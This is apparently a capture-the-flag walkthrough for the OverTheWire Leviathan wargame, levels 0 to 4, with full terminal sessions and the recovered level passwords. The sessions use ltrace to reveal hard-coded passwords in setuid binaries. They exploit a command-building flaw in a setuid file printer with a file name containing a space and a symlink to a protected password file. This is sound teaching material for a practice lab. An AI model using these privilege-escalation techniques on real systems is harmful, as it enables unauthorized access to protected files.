# leviathan
https://overthewire.org/wargames/leviathan/

```
Dare you face the lord of the oceans?
Leviathan is a wargame that has been rescued from the demise of intruded.net, previously hosted on leviathan.intruded.net. Big thanks to adc, morla and reth for their help in resurrecting this game!

What follows below is the original description of leviathan, copied from intruded.net:

Summary:
Difficulty:     1/10
Levels:         8
Platform:   Linux/x86

Author:
Anders Tonfeldt

Special Thanks:
We would like to thank AstroMonk for coming up with a replacement idea for the last level,
deadfood for finding a leveljump and Coi for finding a non-planned vulnerability.

Description:
This wargame doesn't require any knowledge about programming - just a bit of common
sense and some knowledge about basic *nix commands. We had no idea that it'd be this
hard to make an interesting wargame that wouldn't require programming abilities from 
the players. Hopefully we made an interesting challenge for the new ones.
Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on leviathan.labs.overthewire.org through SSH on port 2223.

To login to the first level use:

Username: leviathan0
Password: leviathan0
Data for the levels can be found in the homedirectories. You can look at /etc/leviathan_pass for the various level passwords.
```

## 0->1
This level involves `grep`-ing a directory.

```bash
% ssh leviathan.labs.overthewire.org -l leviathan0 -p 2223

leviathan0@gibson:~$ ls -alh
total 24K
drwxr-xr-x  3 root       root       4.0K Apr 10 14:23 .
drwxr-xr-x 83 root       root       4.0K Apr 10 14:24 ..
drwxr-x---  2 leviathan1 leviathan0 4.0K Apr 10 14:23 .backup
-rw-r--r--  1 root       root        220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root       root       3.7K Mar 31  2024 .bashrc
-rw-r--r--  1 root       root        807 Mar 31  2024 .profile
leviathan0@gibson:~$ cd .backup/
leviathan0@gibson:~/.backup$ ls -lh
total 132K
-rw-r----- 1 leviathan1 leviathan0 131K Apr 10 14:23 bookmarks.html
leviathan0@gibson:~/.backup$ grep leviathan bookmarks.html 
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

## 1->2
This level introduces us to two commands, ltrace and strings.


```bash
% ssh leviathan.labs.overthewire.org -l leviathan1 -p 2223
leviathan1@gibson:~$ ls -lh
total 16K
-r-sr-x--- 1 leviathan2 leviathan1 15K Apr 10 14:23 check
leviathan1@gibson:~$ file check
check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=990fa9b7d511205601669835610d587780d0195e, for GNU/Linux 3.2.0, not stripped
leviathan1@gibson:~$ whoami
leviathan1
leviathan1@gibson:~$ ./check
password: test
Wrong password, Good Bye ...
leviathan1@gibson:~$ ltrace ./check
__libc_start_main(0x80490ed, 1, 0xffffd494, 0 <unfinished ...>
printf("password: ")                                                                = 10
getchar(0, 0, 0x786573, 0x646f67password: test
)                                                   = 116
getchar(0, 116, 0x786573, 0x646f67)                                                 = 101
getchar(0, 0x6574, 0x786573, 0x646f67)                                              = 115
strcmp("tes", "sex")                                                                = 1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                = 29
+++ exited (status 0) +++
leviathan1@gibson:~$ ./check
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
NsN1HwFoyN
```


## 2->3
This level involves creating a symbolic link (symlink) which enables privilege escalation by exploiting how the printfile binary handles file inputs.

By creating a symlink and calling the printfile binary with a filename that includes a space, you leverage the improper input handling in the program. This combination allows access to files that leviathan2 wouldn’t normally have permissions for, thus effectively "hacking" the system to print the sensitive file's contents.

Feeding two inputs to the printfile binary gives us several insights into how the binary processes inputs and how it manages to retrieve file contents. The behavior of the binary with two inputs shows that it accepts and processes only the first argument. The first step in the binary’s execution is to perform an access check for the first file. The `snprintf` call shows how the command is constructed. The calls to `geteuid()` reveal the effective user ID during execution. By running `ltrace`, you can infer potential vulnerabilities.

The fact that input parsing only considers the first file suggests that if unexpected input patterns (like filenames with spaces) are used, it might exploit the way the binary interprets or constructs file names. This detail can lead to privilege escalation tactics.


```bash
% ssh leviathan.labs.overthewire.org -l leviathan2 -p 2223

leviathan2@gibson:~$ ls -alh
total 36K
drwxr-xr-x  2 root       root       4.0K Apr 10 14:23 .
drwxr-xr-x 83 root       root       4.0K Apr 10 14:24 ..
-rw-r--r--  1 root       root        220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root       root       3.7K Mar 31  2024 .bashrc
-r-sr-x---  1 leviathan3 leviathan2  15K Apr 10 14:23 printfile
-rw-r--r--  1 root       root        807 Mar 31  2024 .profile
leviathan2@gibson:~$ file printfile 
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=79cfa8b87bb611f9cf6d6865010709e2ba5c8e3f, for GNU/Linux 3.2.0, not stripped
leviathan2@gibson:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@gibson:~$ ./printfile .bash_logout 
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
leviathan2@gibson:~$ ./printfile .bash_logout .profile
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
leviathan2@gibson:~$ ltrace ./printfile .bash_logout .profile
__libc_start_main(0x80490ed, 3, 0xffffd464, 0 <unfinished ...>
access(".bash_logout", 4)                                                           = 0
snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout")               = 21
geteuid()                                                                           = 12002
geteuid()                                                                           = 12002
setreuid(12002, 12002)                                                              = 0
system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                              = 0
+++ exited (status 0) +++
leviathan2@gibson:~$ mktemp -d
/tmp/tmp.kDdtlswch4
leviathan2@gibson:~$ cd /tmp/tmp.kDdtlswch4
leviathan2@gibson:/tmp/tmp.kDdtlswch4$ touch "test file.txt"
leviathan2@gibson:/tmp/tmp.kDdtlswch4$ cd ~
leviathan2@gibson:~$ ./printfile /tmp/tmp.kDdtlswch4/test\ file.txt 
/bin/cat: /tmp/tmp.kDdtlswch4/test: Permission denied
/bin/cat: file.txt: No such file or directory
leviathan2@gibson:~$ ./printfile /tmp/tmp.kDdtlswch4/"test file.txt"
/bin/cat: /tmp/tmp.kDdtlswch4/test: Permission denied
/bin/cat: file.txt: No such file or directory
leviathan2@gibson:~$ ltrace ./printfile /tmp/tmp.kDdtlswch4/"test file.txt"
__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
access("/tmp/tmp.kDdtlswch4/test file.tx"..., 4)                                    = 0
snprintf("/bin/cat /tmp/tmp.kDdtlswch4/tes"..., 511, "/bin/cat %s", "/tmp/tmp.kDdtlswch4/test file.tx"...) = 42
geteuid()                                                                           = 12002
geteuid()                                                                           = 12002
setreuid(12002, 12002)                                                              = 0
system("/bin/cat /tmp/tmp.kDdtlswch4/tes".../bin/cat: /tmp/tmp.kDdtlswch4/test: No such file or directory
/bin/cat: file.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                              = 256
+++ exited (status 0) +++
leviathan2@gibson:~$ cd /tmp/tmp.kDdtlswch4
leviathan2@gibson:/tmp/tmp.kDdtlswch4$ ln -s /etc/leviathan_pass/leviathan3 ./test
leviathan2@gibson:/tmp/tmp.kDdtlswch4$ ls -alh
total 232K
drwx------   2 leviathan2 leviathan2 4.0K May 24 02:25 .
drwxrwx-wt 559 root       root       224K May 24 02:25 ..
lrwxrwxrwx   1 leviathan2 leviathan2   30 May 24 02:25 test -> /etc/leviathan_pass/leviathan3
-rw-rw-r--   1 leviathan2 leviathan2    0 May 24 02:22 test file.txt
leviathan2@gibson:/tmp/tmp.kDdtlswch4$ cd ~
leviathan2@gibson:~$ ./printfile /tmp/tmp.kDdtlswch4/"test file.txt"
/bin/cat: /tmp/tmp.kDdtlswch4/test: Permission denied
/bin/cat: file.txt: No such file or directory
leviathan2@gibson:~$ chmod 777 /tmp/tmp.kDdtlswch4
leviathan2@gibson:~$ ./printfile /tmp/tmp.kDdtlswch4/"test file.txt"
f0n8h2iWLP
/bin/cat: file.txt: No such file or directory
```

## 3->4
This level involves using `ltrace`.

```bash
leviathan3@gibson:~$ ls -alh
total 40K
drwxr-xr-x  2 root       root       4.0K Apr 10 14:23 .
drwxr-xr-x 83 root       root       4.0K Apr 10 14:24 ..
-rw-r--r--  1 root       root        220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root       root       3.7K Mar 31  2024 .bashrc
-r-sr-x---  1 leviathan4 leviathan3  18K Apr 10 14:23 level3
-rw-r--r--  1 root       root        807 Mar 31  2024 .profile
leviathan3@gibson:~$ ./level3
Enter the password> test
bzzzzzzzzap. WRONG
leviathan3@gibson:~$ ltrace ./level3
__libc_start_main(0x80490ed, 1, 0xffffd494, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                          = -1
printf("Enter the password> ")                                                      = 20
fgets(Enter the password> test
"test\n", 256, 0xf7fae5c0)                                                    = 0xffffd26c
strcmp("test\n", "snlprintf\n")                                                     = 1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                          = 19
+++ exited (status 0) +++
leviathan3@gibson:~$ ./level3 snlprintf
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
WG1egElCvO
```
